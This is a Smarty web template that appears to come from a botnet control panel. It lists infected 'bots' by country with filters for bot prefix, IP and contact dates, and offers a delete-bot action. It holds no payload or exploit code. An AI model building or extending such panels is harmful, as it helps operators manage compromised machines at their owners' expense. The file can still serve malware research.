<div class="top_menu">

<div class="top_menu_left">
<b>{$lang.country}: {$country_name}</b>
</div>

<div class="top_menu_right">
<a href="/bots/index.html" onclick="return get_hax({ldelim}url:'/bots/index.html?ajax=1',method:'get',id:'content'{rdelim});">{$lang.nksc}</a>&nbsp;
</div>

</div>
<hr />

{if $_SESSION.user->access.bots.filter_country_list eq on}
<div style="text-align: right; padding-right: 10px; padding-left: 10px">
<form name="filters_country" id="filters_country" action="#" method="post" enctype="application/x-www-form-urlencoded">
{$lang.pref}: <select id="prefix" name="prefix" style="width:600px">
{if $_SESSION.user->config.prefix eq ''}<option value="">{$lang.all}</option>{/if}
{foreach from=$prefix item=pref}
<option value="{$pref}" {if $_SESSION['search'][$Cur['str']]['prefix'] eq $pref} selected="selected"{/if}>{$pref}</option>
{/foreach}
</select>
<hr />
{$lang.maip} (<a onclick="alert('{$lang.mikci}');" style="cursor:pointer">?</a>): <input id="ip" name="ip" value="{$_SESSION['search'][$Cur['str']]['ip']}" style="width:600px" />
<hr />
{$lang.jbot} (<a onclick="alert('{$lang.jbotv}');" style="cursor:pointer">?</a>): <input id="life_ot" name="life_ot" value="{$_SESSION['search'][$Cur['str']]['life_ot']}" style="width:600px" />
<hr />
{$lang.jbdo} (<a onclick="alert('{$lang.jbdtv}');" style="cursor:pointer">?</a>): <input id="life_do" name="life_do" value="{$_SESSION['search'][$Cur['str']]['life_do']}" style="width:600px" />
<hr />
{$lang.dpjb} (<a onclick="alert('{$lang.kdydpjb}');" style="cursor:pointer">?</a>): <select name="type_life" style="width:600px">
<option value="last_date" {if $_SESSION['search'][$Cur['str']]['type_life'] eq 'last_date'} selected="selected"{/if}>{$lang.posl}</option>
<option value="post_date" {if $_SESSION['search'][$Cur['str']]['type_life'] eq 'post_date'} selected="selected"{/if}>{$lang.perv}</option>
</select>
<hr />
{$lang.sort}: <select name="sort" style="width:600px">
<option value="" selected="selected">{$lang.stan}</option>
<option value="conn1" {if $_SESSION['search'][$Cur['str']]['sort'] eq 'conn1'} selected="selected"{/if}>{$lang.pkpv}</option>
<option value="conn2" {if $_SESSION['search'][$Cur['str']]['sort'] eq 'conn2'} selected="selected"{/if}>{$lang.pkvy}</option>
<option value="conn3" {if $_SESSION['search'][$Cur['str']]['sort'] eq 'conn3'} selected="selected"{/if}>{$lang.pekpv}</option>
<option value="conn4" {if $_SESSION['search'][$Cur['str']]['sort'] eq 'conn4'} selected="selected"{/if}>{$lang.pekvy}</option>
</select>
<hr />
<input type="button" name="update" value="{$lang.upda}" style="width:100%" onclick="return get_hax({ldelim}url: '/bots/country-{$Cur.str}.html?ajax=1',method:'post',id:'content',form:this.form.name{rdelim});" />
</form>
</div>
<hr />
{/if}
<br />
<div style="font-size:10px; position:relative" align="center">
<div style="position:absolute; left: 0px; top:10px">{$lang.mbns}: {$_SESSION.user->config.cp.bots_country}</div>
&nbsp;{$pages}&nbsp;
<div style="position:absolute; right: 0px; top:10px">{$lang.vsbo}: {$counts.alls}</div>
</div>
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
<td style="width: 1px; text-align: center">#</td>
<td style="width: 50%; text-align: center">{$lang.pref}</td>
<td style="width: 15%; text-align: center">{$lang.ip}</td>
<td style="width: 35%; text-align: center">{$lang.posken}</td>
<td>&nbsp;</td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr id="tr_{$key}" class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;">
<th><input type="checkbox" name="{$item->ip}" value="{$item->ip}" /></th>
<th onclick="get_bot_window('{$item->id}');" title="{$item->uid}">{$item->prefix}</th>
<th onclick="get_bot_window('{$item->id}');">{$item->ip}</th>
<th onclick="get_bot_window('{$item->id}');">{$item->last_date|@TimeStampToStr}</th>
<th><a href="#" onclick="if(confirm('{$lang.dyb} \'{$item->prefix}{$item->uid}\'?')) get_hax({ldelim}url: '/bots/delete_bot-{$item->id}.html?ajax=1&amp;str={$Cur.str}&amp;page={$Cur.page}',method: 'get',id: 'content'{rdelim});"><img src="/images/delete.png" alt="{$lang.delet}" title="{$lang.delet}" border="0" /></a></th>
</tr>
{/foreach}
</table>

<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>